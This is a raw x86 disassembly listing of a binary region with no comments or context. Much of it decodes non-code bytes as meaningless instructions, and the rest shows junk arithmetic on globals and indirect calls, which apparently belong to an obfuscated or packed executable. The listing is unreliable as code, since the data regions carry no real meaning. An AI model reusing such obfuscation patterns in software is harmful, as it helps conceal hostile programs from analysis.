  418682:	mov    ebp,0xaad994e4
  418687:	call   0x91ce6bcc
  41868c:	arpl   WORD PTR [ebp+0x42ae49d7],bp
  418692:	es js  0x4186a4
  418695:	into   
  418696:	js     0x4186a0
  418698:	xchg   esp,eax
  418699:	(bad)  
  41869a:	jge    0x4186a4
  41869c:	in     al,0xa4
  41869e:	ret    0x9cde
  4186a1:	shr    DWORD PTR [esi-0x4e25099c],0xb
  4186a8:	sub    BYTE PTR [eax-0x29253931],dl
  4186ae:	aaa    
  4186af:	xchg   esp,eax
  4186b0:	inc    ebp
  4186b1:	mov    esp,0x87cf86ea
  4186b6:	das    
  4186b7:	mov    edi,0x6cf8033b
  4186bc:	ficomp DWORD PTR [esi+0x5f8cce15]
  4186c2:	shl    DWORD PTR [edx-0x354b7778],0x8e
  4186c9:	das    
  4186ca:	add    esp,ecx
  4186cc:	mov    ch,BYTE PTR [esi-0x16]
  4186cf:	fimul  DWORD PTR [esi]
  4186d1:	ficomp DWORD PTR [eax+0x12fbc7a7]
  4186d7:	aad    0xa5
  4186d9:	and    dl,dh
  4186db:	lods   al,BYTE PTR ds:[esi]
  4186dc:	(bad)  
  4186dd:	ins    DWORD PTR es:[edi],dx
  4186de:	(bad)  
  4186df:	prefetch (bad)
  4186e0:	or     eax,0xbad4f1d8
  4186e5:	add    ch,BYTE PTR [ebx-0x18]
  4186e8:	je     0x418750
  4186ea:	jle    0x418765
  4186ec:	dec    esp
  4186ed:	call   0x946839f5
  4186f2:	jle    0x418770
  4186f4:	and    BYTE PTR [eax-0x55b3d882],0xa8
  4186fb:	jecxz  0x418699
  4186fd:	inc    esp
  4186fe:	test   BYTE PTR [edx],bh
  418700:	scas   eax,DWORD PTR es:[edi]
  418701:	pop    ecx
  418702:	scas   al,BYTE PTR es:[edi]
  418703:	(bad)  
  418704:	mov    edi,0x333603e6
  418709:	sbb    al,0x2
  41870b:	ins    BYTE PTR es:[edi],dx
  41870c:	cs ins DWORD PTR es:[edi],dx
  41870e:	mov    ebp,0x3fca5e14
  418713:	cmp    dh,dh
  418715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418716:	mov    ds:0x81acd1bb,eax
  41871b:	xchg   esp,eax
  41871c:	inc    ebp
  41871d:	fld    DWORD PTR [edi+ebx*1-0x4ee85c3c]
  418724:	push   0xc754ff3a
  418729:	rcl    BYTE PTR [ebx],0x91
  41872c:	clc    
  41872d:	xchg   ebx,eax
  41872e:	mov    eax,ds:0x3fae5e66
  418733:	jl     0x418799
  418735:	xchg   edx,eax
  418736:	mov    ebx,edx
  418738:	cmp    DWORD PTR ds:[ebp+0x551c0ad7],edx
  41873f:	neg    DWORD PTR [eax+0x18]
  418742:	call   0xfdc9:0xbb5b35b
  418749:	daa    
  41874a:	mov    esi,0xbb40572
  41874f:	ror    ch,1
  418751:	xchg   DWORD PTR [eax-0x4e],ecx
  418754:	test   DWORD PTR [edi-0x1b],ebx
  418757:	push   esi
  418758:	pop    ss
  418759:	jg     0x41878d
  41875b:	pop    ebp
  41875c:	stos   BYTE PTR es:[edi],al
  41875d:	sahf   
  41875e:	pusha  
  41875f:	test   eax,0xe52ed3e3
  418764:	ss jae 0x418761
  418767:	push   ebx
  418768:	in     al,dx
  418769:	and    BYTE PTR [esp+edi*1],0xbe
  41876d:	scas   eax,DWORD PTR es:[di]
  41876f:	jp     0x41870d
  418771:	aad    0x43
  418773:	sub    eax,0x41be078c
  418778:	dec    esp
  418779:	(bad)  
  41877a:	adc    BYTE PTR [eax],bl
  41877c:	das    
  41877d:	rcl    BYTE PTR [ebx+0x26],1
  418780:	daa    
  418781:	outs   dx,DWORD PTR ds:[esi]
  418782:	test   al,0xd7
  418784:	sbb    ch,BYTE PTR [edi]
  418786:	int3   
  418787:	push   eax
  418788:	mov    dh,BYTE PTR [ecx+0x14]
  41878b:	inc    edx
  41878c:	call   0xdbfeb15a
  418791:	jp     0x4187c4
  418793:	push   cs
  418794:	xor    DWORD PTR [ecx+ecx*4],ebx
  418797:	retf   
  418798:	lock and BYTE PTR [ecx],cl
  41879b:	aas    
  41879c:	in     al,dx
  41879d:	retf   0x3436
  4187a0:	outs   dx,BYTE PTR ds:[esi]
  4187a1:	jle    0x4187aa
  4187a3:	jg     0x4187be
  4187a5:	outs   dx,DWORD PTR ds:[esi]
  4187a6:	neg    DWORD PTR [esi-0x25]
  4187a9:	sbb    dl,BYTE PTR [edi-0x1e]
  4187ac:	lea    esp,[edx]
  4187ae:	add    BYTE PTR [ecx+ecx*4],bh
  4187b1:	push   0xffffffe2
  4187b3:	mov    dh,0xcb
  4187b5:	jne    0x4187e6
  4187b7:	pop    ebx
  4187b8:	or     dh,BYTE PTR [ecx+0x3f3da242]
  4187be:	mov    esp,0x40da3704
  4187c3:	es and eax,0x4c678182
  4187c9:	fild   DWORD PTR [esi-0x6e70242f]
  4187cf:	neg    bl
  4187d1:	cdq    
  4187d2:	pop    ss
  4187d3:	repnz stos DWORD PTR es:[edi],eax
  4187d5:	test   eax,0xcd488a45
  4187da:	leave  
  4187db:	les    esi,FWORD PTR [ebp-0x57]
  4187de:	enter  0x16d3,0x9c
  4187e2:	ins    BYTE PTR es:[edi],dx
  4187e3:	mov    cs,ecx
  4187e5:	imul   ebp,DWORD PTR [ebx-0x7e550af8],0xffffffaf
  4187ec:	ror    ah,cl
  4187ee:	imul   ebx,esp,0x206c37c3
  4187f4:	mov    eax,0x8877e6f3
  4187f9:	mov    bh,0x8b
  4187fb:	mov    dh,0x18
  4187fd:	sahf   
  4187fe:	fs adc bl,bl
  418801:	sub    eax,0xb1fc9659
  418806:	jmp    0x5399141
  41880b:	ror    cl,1
  41880d:	xlat   BYTE PTR ds:[ebx]
  41880e:	lea    ecx,[ecx+0x1fb7ee7e]
  418814:	push   es
  418815:	jl     0x41888e
  418817:	jae    0x4187fd
  418819:	iret   
  41881a:	push   esp
  41881b:	inc    ecx
  41881c:	jg     0x418819
  41881e:	and    BYTE PTR [eax],ch
  418820:	cmc    
  418821:	sub    al,0xde
  418823:	pop    ds
  418824:	push   ds
  418825:	loopne 0x4187c4
  418827:	sbb    esi,DWORD PTR [eax]
  418829:	push   di
  41882b:	retf   
  41882c:	jecxz  0x418861
  41882e:	xchg   esi,eax
  41882f:	into   
  418830:	jmp    esi
  418832:	add    BYTE PTR [esp+edx*8+0x1a],0x88
  418837:	test   eax,0x3c7fc182
  41883c:	stos   BYTE PTR es:[edi],al
  41883d:	mov    cl,0xfe
  41883f:	daa    
  418840:	inc    esp
  418841:	or     eax,0xd852f602
  418846:	xchg   BYTE PTR ss:[ebx-0x38fb121f],dh
  41884d:	sub    bl,al
  41884f:	scas   eax,DWORD PTR es:[edi]
  418850:	fcmovnb st,st(0)
  418852:	hlt    
  418853:	mov    ds:0x83fada17,eax
  418858:	mov    dl,0xc1
  41885a:	jns    0x4187df
  41885c:	popa   
  41885d:	rcr    DWORD PTR [esi+0x6e1042d9],1
  418863:	imul   edx,DWORD PTR [esi+0x2a],0x25eae9da
  41886a:	jmp    0xc34f:0x9a34f583
  418871:	ror    ah,cl
  418873:	sbb    ebx,DWORD PTR [ebp-0x41fd690f]
  418879:	pop    esp
  41887a:	push   edx
  41887b:	cmp    edi,ecx
  41887d:	in     al,dx
  41887e:	push   es
  41887f:	or     DWORD PTR [edi+0x218d764],edx
  418885:	rcl    ebp,cl
  418887:	jmp    0x10c:0x93cda274
  41888e:	loope  0x41882a
  418890:	mov    dh,0x4
  418892:	ficom  WORD PTR [esi+0x3991354f]
  418898:	inc    esi
  418899:	jo     0x41882a
  41889b:	xchg   ebx,eax
  41889c:	and    eax,edx
  41889e:	push   esp
  41889f:	scas   al,BYTE PTR es:[edi]
  4188a0:	mov    edi,DWORD PTR [esi]
  4188a2:	push   edi
  4188a3:	shl    BYTE PTR [eax+0x626044dd],1
  4188a9:	jl     0x41882b
  4188ab:	and    BYTE PTR [edi+0x19fc0663],dh
  4188b1:	cmp    DWORD PTR [edi],ecx
  4188b3:	add    BYTE PTR [ebx+ecx*4],0x4c
  4188b7:	and    al,0x48
  4188b9:	or     DWORD PTR ds:0x42823b,0x42822b
  4188c3:	xor    eax,ecx
  4188c5:	adc    ecx,DWORD PTR ds:0x428153
  4188cb:	mov    ecx,DWORD PTR [esp+0x28]
  4188cf:	div    ecx
  4188d1:	adc    DWORD PTR ds:0x428243,0x42829b
  4188db:	and    eax,0x100
  4188e0:	xor    DWORD PTR ds:0x42818f,0x428293
  4188ea:	or     eax,0x290
  4188ef:	xor    DWORD PTR ds:0x42823f,0x42837f
  4188f9:	push   DWORD PTR [eax-0x494a7887]
  4188ff:	xor    DWORD PTR ds:0x42827b,0x7154
  418909:	call   DWORD PTR ds:0x428da8
  41890f:	or     DWORD PTR ds:0x428293,0x6165
  418919:	dec    esi
  41891a:	jne    0x417913
  418920:	add    DWORD PTR ds:0x428397,edi
  418926:	mov    DWORD PTR [esp+0x18],0xca79a575
  41892e:	cmp    DWORD PTR ds:0x42831f,0x0
  418935:	mov    DWORD PTR ds:0x4282ff,ebx
  41893b:	mov    DWORD PTR ds:0x428283,ebx
  418941:	mov    esi,DWORD PTR ds:0x428253
  418947:	mov    esi,0x63e7
  41894c:	jmp    0x4189b1
  418951:	mov    esi,0x7fb2
  418956:	cmp    DWORD PTR ds:0x42831f,0x0
  41895d:	jb     0x41898b
  418963:	push   0x4fb4
  418968:	call   DWORD PTR ds:0x428dec
  41896e:	movzx  esi,WORD PTR ds:0x428323
  418975:	sbb    DWORD PTR ds:0x428163,esi
  41897b:	adc    DWORD PTR ds:0x42836f,0x5f0e
  418985:	xor    DWORD PTR ds:0x4283a7,ebx
  41898b:	mov    esi,DWORD PTR ds:0x428237
  418991:	xor    esi,DWORD PTR ds:0x428173
  418997:	mov    DWORD PTR ds:0x428237,esi
  41899d:	add    DWORD PTR ds:0x428247,0x2d72
  4189a7:	sbb    DWORD PTR ds:0x4283a3,0x7522
  4189b1:	mov    esi,0x9c1b89e8
  4189b6:	mov    DWORD PTR [esp+0x1c],esi
  4189ba:	and    DWORD PTR ds:0x42837b,0x42823b
  4189c4:	mov    DWORD PTR [esp+0x70],0xca79a571
  4189cc:	mov    DWORD PTR [esp+0x74],esi
  4189d0:	xor    DWORD PTR ds:0x428163,0xa7a
  4189da:	call   0x40aa10
  4189df:	cmp    DWORD PTR ds:0x42831b,0x0
  4189e6:	mov    edi,DWORD PTR ds:0x4282a3
  4189ec:	mov    edx,DWORD PTR ds:0x42822b
  4189f2:	not    edx
  4189f4:	jmp    0x418a47
  4189f9:	mov    DWORD PTR ds:0x4283a3,0x606f
  418a03:	mov    DWORD PTR ds:0x42817f,ebx
  418a09:	cmp    DWORD PTR ds:0x42831b,0x0
  418a10:	jle    0x418a3f
  418a16:	call   DWORD PTR ds:0x428df0
  418a1c:	adc    DWORD PTR ds:0x42815b,ebx
  418a22:	or     DWORD PTR ds:0x42825f,0x5c58
  418a2c:	xor    ecx,ecx
  418a2e:	add    ecx,DWORD PTR ds:0x42820f
  418a34:	mov    edx,DWORD PTR ds:0x428333
  418a3a:	sub    ecx,edx
  418a3c:	and    ecx,DWORD PTR [ecx+edx*1]
  418a3f:	sub    edi,edx
  418a41:	sbb    ecx,DWORD PTR ds:0x428323
  418a47:	lea    eax,[esp+0x44]
  418a4b:	mov    DWORD PTR [esp+0xc],eax
  418a4f:	lea    eax,[esp+0x60]
  418a53:	add    DWORD PTR ds:0x4282a7,edi
  418a59:	mov    DWORD PTR [esp+0x10],eax
  418a5d:	cmp    DWORD PTR ds:0x4283a3,0x0
  418a64:	mov    edx,0x1d6
  418a69:	mov    DWORD PTR ds:0x42827b,0x11c5
  418a73:	mov    DWORD PTR ds:0x428397,ecx
  418a79:	jmp    0x418ad0
  418a7e:	movzx  eax,WORD PTR ds:0x42815b
  418a85:	mov    eax,ds:0x42829b
  418a8a:	cmp    DWORD PTR ds:0x4283a3,0x0
  418a91:	je     0x418ab0
  418a97:	push   0x2fa1
  418a9c:	call   DWORD PTR ds:0x428e90
  418aa2:	or     edi,ecx
  418aa4:	sbb    edi,0x59b9
  418aaa:	sbb    edx,0x32c6
  418ab0:	xor    DWORD PTR ds:0x428373,0x4bc8
  418aba:	sub    DWORD PTR ds:0x428283,edi
  418ac0:	or     DWORD PTR ds:0x42827b,0x2abb
  418aca:	sbb    DWORD PTR ds:0x42836f,ebx
  418ad0:	mov    eax,ds:0x422558
  418ad5:	mov    eax,DWORD PTR [eax+0x1d8]
  418adb:	sbb    DWORD PTR ds:0x42817b,ebx
  418ae1:	jmp    0x418eb0
  418ae6:	js     0x418b42
  418ae8:	push   ebp
  418ae9:	xor    eax,0x1a781a3b
  418aee:	or     eax,0xf5b0b184
  418af3:	mov    ebp,ecx
  418af5:	stos   BYTE PTR es:[edi],al
  418af6:	call   0x1812:0xbc1816cb
  418afd:	sbb    BYTE PTR [eax+0x19],dl
  418b00:	dec    ebx
  418b01:	sub    DWORD PTR [esi-0x5bda50b2],edi
  418b07:	pop    ebp
  418b08:	add    eax,0x94e81303
  418b0d:	add    eax,0xbd9e2322
  418b12:	and    BYTE PTR [ecx],dl
  418b14:	xchg   ecx,eax
  418b15:	dec    ebp
  418b16:	out    dx,al
  418b17:	lods   eax,DWORD PTR ds:[esi]
  418b18:	call   0x9f9d:0x453f6d6
  418b1f:	sar    BYTE PTR ds:0x9b8188c2,cl
  418b25:	jg     0x418b74
  418b27:	retf   0xb768
  418b2a:	xchg   DWORD PTR [edx],ecx
  418b2c:	add    ah,BYTE PTR [edx]
  418b2e:	inc    eax
  418b2f:	xchg   esi,eax
  418b30:	mov    BYTE PTR [ebx+0x72],al
  418b33:	jmp    0x418b4c
  418b35:	push   es
  418b36:	lods   al,BYTE PTR ds:[esi]
  418b37:	bound  esi,QWORD PTR [edx]
  418b39:	clc    
  418b3a:	mov    edx,0xa59075f1
  418b3f:	add    DWORD PTR [ebx+0x634c29e5],ebx
  418b45:	xor    eax,0xe0de2011
  418b4a:	jecxz  0x418ae9
  418b4c:	mov    ds:0xb5947c2f,al
  418b51:	icebp  
  418b52:	ficomp WORD PTR [edi]
  418b54:	lods   eax,DWORD PTR ds:[esi]
  418b55:	clc    
  418b56:	fwait
  418b57:	lods   eax,DWORD PTR gs:[esi]
  418b59:	jne    0x418b69
  418b5b:	dec    edx
  418b5c:	jbe    0x418b13
  418b5e:	xchg   esp,eax
  418b5f:	or     al,0xe9
  418b61:	icebp  
  418b62:	inc    ebp
  418b63:	lahf   
  418b64:	stos   DWORD PTR es:[edi],eax
  418b65:	push   esi
  418b66:	pop    es
  418b67:	in     eax,0xf3
  418b69:	sbb    BYTE PTR [eax+0x4b],ah
  418b6c:	fmul   st(7),st
  418b6e:	xor    eax,0x13448b18
  418b73:	loope  0x418b44
  418b75:	sbb    DWORD PTR [ecx-0x684a94d6],0xc2f957b1
  418b7f:	and    al,0xf7
  418b81:	ins    BYTE PTR es:[edi],dx
  418b82:	scas   eax,DWORD PTR es:[edi]
  418b83:	sub    DWORD PTR [ebp+eax*8-0x27882be7],esp
  418b8a:	cmp    esi,DWORD PTR [esi-0x5b2da6f1]
  418b90:	mov    ch,0x1c
  418b92:	iret   
  418b93:	inc    eax
  418b94:	call   0xb09d1c4a
  418b99:	cmp    BYTE PTR [esi+0x3ac2d8eb],dl
  418b9f:	or     DWORD PTR [ecx-0x5576944c],ecx
  418ba5:	sbb    eax,0xf353ed39
  418baa:	mov    cl,0xbf
  418bac:	xchg   ecx,eax
  418bad:	retf   
  418bae:	bound  esi,QWORD PTR [ecx-0x22a0fc4d]
  418bb4:	add    ebx,DWORD PTR [eax-0x6e]
  418bb7:	pop    eax
  418bb8:	in     eax,dx
  418bb9:	inc    ebx
  418bba:	pop    esi
  418bbb:	cli    
  418bbc:	mov    ebx,0xcff99afb
  418bc1:	(bad)  
  418bc2:	ins    BYTE PTR es:[edi],dx
  418bc3:	dec    ecx
  418bc4:	in     al,0xf3
  418bc6:	addr16 out 0xf8,al
  418bc9:	gs das 
  418bcb:	pop    eax
  418bcc:	arpl   WORD PTR [edx+0x46],dx
  418bcf:	lahf   
  418bd0:	lods   al,BYTE PTR ds:[esi]
  418bd1:	test   al,0x7f
  418bd3:	and    al,0xa8
  418bd5:	lds    ebp,FWORD PTR [edx-0x3d]
  418bd8:	jbe    0x418b8b
  418bda:	ja     0x418c38
  418bdc:	out    dx,eax
  418bdd:	in     eax,0x3f
  418bdf:	sub    bl,BYTE PTR [ecx+eax*8-0x6]
  418be3:	jmp    0x418b74
  418be5:	ror    BYTE PTR [ecx+0x2bc690d2],cl
  418beb:	pop    edx
  418bec:	stos   BYTE PTR es:[edi],al
  418bed:	sub    eax,0xf74eabee
  418bf2:	cmp    eax,0xb285b921
  418bf7:	(bad)  
  418bf8:	jge    0x418c49
  418bfa:	add    al,0x99
  418bfc:	sar    DWORD PTR [ecx+0x2f7005c8],0x9c
  418c03:	and    DWORD PTR ds:0x389f4c8e,esi
  418c09:	in     al,0xb8
  418c0b:	lods   eax,DWORD PTR ds:[esi]
  418c0c:	mov    esi,0x4aaefc21
  418c11:	gs dec edx
  418c13:	adc    BYTE PTR [edi],bh
  418c15:	and    DWORD PTR [edi-0x43],edi
  418c18:	cli    
  418c19:	rcr    DWORD PTR ds:0x79ecb87f,cl
  418c1f:	xor    DWORD PTR [ebp-0x5d],ecx
  418c22:	push   edx
  418c23:	dec    edx
  418c24:	test   ch,al
  418c26:	sbb    bh,BYTE PTR ds:0x5024b7cb
  418c2c:	add    eax,0x7258178c
  418c31:	pop    ecx
  418c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c33:	mov    ch,BYTE PTR [edx]
  418c35:	rcr    DWORD PTR [edx+edi*8+0x77],cl
  418c39:	mov    ds:0xf06a9d2e,al
  418c3e:	lock shr cl,1
  418c41:	adc    bh,BYTE PTR [esi]
  418c43:	mov    bl,0x7c
  418c45:	ficomp DWORD PTR [eax]
  418c47:	mov    edi,edx
  418c49:	and    esp,DWORD PTR [ebp+0x6c14cdd8]
  418c4f:	inc    ecx
  418c50:	mov    bh,0x7f
  418c52:	jle    0x418cc9
  418c54:	jp     0x418cb7
  418c56:	js     0x418bf9
  418c58:	pusha  
  418c59:	sub    eax,0xa6f005dd
  418c5e:	pop    es
  418c5f:	arpl   WORD PTR [edx+0x1c2303bf],ax
  418c65:	pop    eax
  418c66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c67:	push   ebx
  418c68:	aas    
  418c69:	retf   0xb8ca
  418c6c:	push   ds
  418c6d:	int3   
  418c6e:	in     al,0xcd
  418c70:	jl     0x418c56
  418c72:	call   0xc56169b1
  418c77:	arpl   sp,si
  418c79:	mov    esi,0xa4c50acc
  418c7e:	and    eax,0x122fa2f4
  418c83:	pop    eax
  418c84:	dec    esi
  418c85:	repz sbb cl,BYTE PTR [edx+ebp*2-0x27]
  418c8a:	adc    DWORD PTR [esi-0x2b],0x2105fd74
  418c91:	or     eax,0x3667386f
  418c96:	mov    ah,al
  418c98:	mov    ds:0x33cf6e40,eax
  418c9d:	mov    ecx,0xf4f12295
  418ca2:	mov    ch,BYTE PTR [edi]
  418ca4:	add    BYTE PTR [edx],bl
  418ca6:	test   DWORD PTR [esi+edx*4-0x467ee2fc],0x89a3d49b
  418cb1:	or     edx,DWORD PTR [ecx-0x3a]
  418cb4:	pop    eax
  418cb5:	add    eax,0x71c642ad
  418cba:	(bad)  
  418cbb:	int3   
  418cbc:	sbb    DWORD PTR [edi],ebx
  418cbe:	ror    BYTE PTR [ecx],cl
  418cc0:	jo     0x418c75
  418cc2:	neg    BYTE PTR ds:0xc62a4628
  418cc8:	jns    0x418c65
  418cca:	ss aaa 
  418ccc:	pop    ds
  418ccd:	pop    ss
  418cce:	xchg   DWORD PTR [edx+0x4c],ecx
  418cd1:	or     dh,dh
  418cd3:	out    dx,al
  418cd4:	dec    ebp
  418cd5:	sti    
  418cd6:	cmp    al,BYTE PTR [edx+0x1cc1d442]
  418cdc:	pusha  
  418cdd:	push   ebx
  418cde:	mov    ds:0x56ef79b8,eax
  418ce3:	push   eax
  418ce4:	push   eax
  418ce5:	and    DWORD PTR [ecx+0x79d38436],0x5d13d6a9
  418cef:	xlat   BYTE PTR ds:[ebx]
  418cf0:	mov    eax,0xdaf81007
  418cf5:	outs   dx,DWORD PTR ds:[esi]
  418cf6:	sub    edi,ecx
  418cf8:	repnz clc 
  418cfa:	stc    
  418cfb:	cld    
  418cfc:	adc    ecx,DWORD PTR [ebx+0x68]
  418cff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d00:	into   
  418d01:	mov    ecx,0x532de3d2
  418d06:	ss push ss
  418d08:	or     al,0x6
  418d0a:	(bad)  
  418d0b:	push   esp
  418d0c:	jp     0x418d6f
  418d0e:	push   ebp
  418d0f:	push   ss
  418d10:	mov    al,ds:0x21318532
  418d15:	cld    
  418d16:	jo     0x418d3f
  418d18:	xlat   BYTE PTR ds:[ebx]
  418d19:	pushf  
  418d1a:	xchg   esi,eax
  418d1b:	lahf   
  418d1c:	pop    esp
  418d1d:	xor    dl,BYTE PTR [edx-0x38cd370]
  418d23:	scas   al,BYTE PTR es:[edi]
  418d24:	xchg   edx,eax
  418d25:	mov    bl,0x3f
  418d27:	jmp    0x9513:0xabcf1c88
  418d2e:	xor    cl,BYTE PTR [eax]
  418d30:	in     al,0x25
  418d32:	shr    BYTE PTR [ecx-0x39],0x76
  418d36:	addr16 iret 
  418d38:	or     DWORD PTR [edx+0xff3c513],edx
  418d3e:	xchg   dl,ah
  418d40:	ror    BYTE PTR [esi+0x62],cl
  418d43:	pop    ss
  418d44:	inc    edx
  418d45:	adc    ecx,DWORD PTR [eax+0x71c9936c]
  418d4b:	xchg   edx,eax
  418d4c:	push   esi
  418d4d:	(bad)  ds:[eax+0x68a36630]
  418d54:	mov    ah,0xcc
  418d56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d57:	and    ebp,DWORD PTR [ecx+ecx*2+0x1cb6acee]
  418d5e:	fcmovnb st,st(4)
  418d60:	inc    edx
  418d61:	sar    DWORD PTR [edi+0x5e073e58],cl
  418d67:	mov    bl,0x61
  418d69:	hlt    
  418d6a:	cmp    DWORD PTR [ebx+0x37],ecx
  418d6d:	(bad)
  418d71:	dec    esp
  418d72:	cmp    al,0xa
  418d74:	xchg   eax,ebx
  418d76:	dec    ecx
  418d77:	fwait
  418d78:	xchg   edx,eax
  418d79:	(bad)
  418d7d:	dec    esi
  418d7e:	push   ebx
  418d7f:	(bad)  
  418d80:	mov    bh,0xbb
  418d82:	fadd   st,st(5)
  418d84:	cmc    
  418d85:	retf   
  418d86:	xchg   ebx,eax
  418d87:	mov    edx,0x62e41d9c
  418d8c:	mov    edx,0x10ea7d2f
  418d91:	xor    al,0xb0
  418d93:	test   BYTE PTR [ebx+0x55],dh
  418d96:	sub    BYTE PTR [edi],ch
  418d98:	enter  0xa4ac,0x18
  418d9c:	sbb    al,0x10
  418d9e:	hlt    
  418d9f:	adc    eax,0x18100693
  418da4:	sub    dl,ch
  418da6:	mov    DWORD PTR [esp+edx*2],esp
  418da9:	xor    eax,DWORD PTR [ecx+0x57]
  418dac:	ds inc ecx
  418dae:	xor    DWORD PTR [ebp-0x7d541e65],edi
  418db4:	add    eax,0x9c601a2c
  418db9:	cmp    al,0x9b
  418dbb:	dec    edi
  418dbc:	xor    DWORD PTR [ecx],esp
  418dbe:	mov    ebx,0x7ab3c5e1
  418dc3:	mov    edi,0x83681caf
  418dc8:	adc    eax,0xc15ae23d
  418dcd:	cmc    
  418dce:	into   
  418dcf:	inc    eax
  418dd0:	mov    al,0xcd
  418dd2:	push   es
  418dd3:	pop    edx
  418dd4:	mov    dl,0xf3
  418dd6:	ja     0x418d80
  418dd8:	addr16 jle 0x418e07
  418ddb:	cmp    eax,0x50ead4ca
  418de0:	dec    eax
  418de1:	or     DWORD PTR [esi-0x4037872],esp
  418de7:	rcr    BYTE PTR [edi-0x76],cl
  418dea:	sbb    dl,BYTE PTR [ecx+0x9]
  418ded:	jns    0x418e54
  418def:	pop    esi
  418df0:	add    bl,dh
  418df2:	repnz mov bl,0x1d
  418df5:	into   
  418df6:	shl    DWORD PTR [eax+0x6f08308c],1
  418dfc:	data16 test BYTE PTR [eax+0xb],ah
  418e00:	sbb    DWORD PTR [ebp+0x11],ebx
  418e03:	push   ds
  418e04:	mov    al,ds:0xf284e172
  418e09:	mov    ds:0x9d95cd29,al
  418e0e:	fsubr  DWORD PTR [edx+0x20]
  418e11:	dec    ebp
  418e12:	mov    BYTE PTR [esi],cl
  418e14:	cs ds leave 
  418e17:	xor    eax,0x90127251
  418e1c:	mov    ?,WORD PTR [edx-0x45045123]
  418e22:	ret    
  418e23:	iret   
  418e24:	push   esp
  418e25:	jmp    0x22f9266c
  418e2a:	mov    bl,BYTE PTR [esi]
  418e2c:	sbb    DWORD PTR [esi+0x4df9fae7],ebp
  418e32:	repz test DWORD PTR [ebx-0x24bdaf0f],edi
  418e39:	cmp    al,0x30
  418e3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e3c:	aam    0x80
  418e3e:	div    eax
  418e40:	push   ecx
  418e41:	adc    al,0x24
  418e43:	pop    ecx
  418e44:	pop    ecx
  418e45:	push   ecx
  418e46:	dec    edx
  418e47:	sub    al,0xd3
  418e49:	pop    esp
  418e4a:	fwait
  418e4b:	and    al,0x37
  418e4d:	xor    eax,0xc3d78591
  418e52:	dec    eax
  418e53:	pop    ebp
  418e54:	xchg   esp,eax
  418e55:	jg     0x418e81
  418e57:	lods   al,BYTE PTR ds:[esi]
  418e58:	push   cs
  418e59:	out    dx,al
  418e5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e5b:	and    DWORD PTR [esi-0x18],eax
  418e5e:	dec    esp
  418e5f:	ror    ch,0x33
  418e62:	pop    eax
  418e63:	pop    ebx
  418e64:	pop    ebp
  418e65:	push   edi
  418e66:	cdq    
  418e67:	cmc    
  418e68:	pop    ecx
  418e69:	popf   
  418e6a:	neg    BYTE PTR ds:[edx+ecx*8]
  418e6e:	sti    
  418e6f:	lahf   
  418e70:	jg     0x418eed
  418e72:	mov    al,ds:0x20e8f426
  418e77:	inc    ebp
  418e78:	push   esp
  418e79:	test   ah,0xb7
  418e7c:	pop    esi
  418e7d:	test   al,0xa2
  418e7f:	mov    bh,0xdf
  418e81:	leave  
  418e82:	mov    ch,0x8a
  418e84:	push   edx
  418e85:	cs push ebx
  418e87:	mov    ebx,0x667002da
  418e8c:	shl    BYTE PTR [ebx-0x11],cl
  418e8f:	sub    edx,DWORD PTR [eax+0x40]
  418e92:	retf   0xe8a7
  418e95:	cmp    esi,DWORD PTR [esi]
  418e97:	mov    al,0x34
  418e99:	shr    dh,1
  418e9b:	fs dec ecx
  418e9d:	and    eax,esp
  418e9f:	lods   eax,DWORD PTR ds:[esi]
  418ea0:	mov    esp,0xc6026eab
  418ea5:	sbb    eax,0x66afe49c
  418eaa:	xchg   esp,eax
  418eab:	sub    DWORD PTR ds:0x8b5e270e,ebx
  418eb1:	add    BYTE PTR [ebx],ah
  418eb3:	leave  
  418eb4:	mov    ecx,eax
  418eb6:	xor    ecx,0xa4069aaf
  418ebc:	cmp    DWORD PTR ds:0x42839f,0x0
  418ec3:	mov    DWORD PTR ds:0x428167,0x216c
  418ecd:	mov    DWORD PTR ds:0x42826b,0x28e7
  418ed7:	mov    DWORD PTR ds:0x428263,0x19fa
  418ee1:	jmp    0x418f4e
  418ee6:	mov    DWORD PTR ds:0x428273,0x562c
  418ef0:	mov    DWORD PTR ds:0x42829b,0x3af5
  418efa:	cmp    DWORD PTR ds:0x42839f,0x0
  418f01:	jae    0x418f2c
  418f07:	push   0x615d
  418f0c:	push   0x428327
  418f11:	push   DWORD PTR [ebp-0x28]
  418f14:	call   DWORD PTR ds:0x428df4
  418f1a:	not    DWORD PTR ds:0x42819b
  418f20:	sub    DWORD PTR ds:0x42838f,0x3f9
  418f2a:	adc    edx,edx
  418f2c:	sub    edi,DWORD PTR ds:0x428153
  418f32:	mov    edx,DWORD PTR ds:0x428297
  418f38:	sbb    DWORD PTR ds:0x42837b,edx
  418f3e:	xor    edi,edi
  418f40:	or     edi,DWORD PTR ds:0x4282d3
  418f46:	mov    edi,DWORD PTR [edi]
  418f48:	and    DWORD PTR ds:0x42830b,edi
  418f4e:	xor    eax,0xfffffffe
  418f51:	and    DWORD PTR ds:0x42838f,edi
  418f57:	shl    eax,0x1e
  418f5a:	shr    ecx,0x2
  418f5d:	sbb    DWORD PTR ds:0x4283a3,edi
  418f63:	or     ecx,eax
  418f65:	cmp    DWORD PTR ds:0x4282fb,0x0
  418f6c:	not    DWORD PTR ds:0x428267
  418f72:	not    DWORD PTR ds:0x428197
  418f78:	mov    DWORD PTR ds:0x4282ef,0x4dce
  418f82:	mov    edx,0xaa6
  418f87:	jmp    0x418fde
  418f8c:	mov    eax,ds:0x42831f
  418f91:	mov    eax,0x4392
  418f96:	cmp    DWORD PTR ds:0x4282fb,0x0
  418f9d:	jae    0x418fc8
  418fa3:	push   0x4547
  418fa8:	push   0x4fda
  418fad:	push   DWORD PTR [ebp-0x1c]
  418fb0:	push   0x42837b
  418fb5:	call   DWORD PTR ds:0x428df8
  418fbb:	inc    edx
  418fbc:	or     DWORD PTR ds:0x42822f,ebx
  418fc2:	xor    edi,DWORD PTR ds:0x42818f
  418fc8:	sbb    edx,0x3d5c
  418fce:	xor    DWORD PTR ds:0x42837f,0x3cf0
  418fd8:	sub    edx,0x3f96
  418fde:	mov    eax,DWORD PTR [esp+0x10]
  418fe2:	mov    DWORD PTR [eax],ecx
  418fe4:	mov    edi,0xca79a565
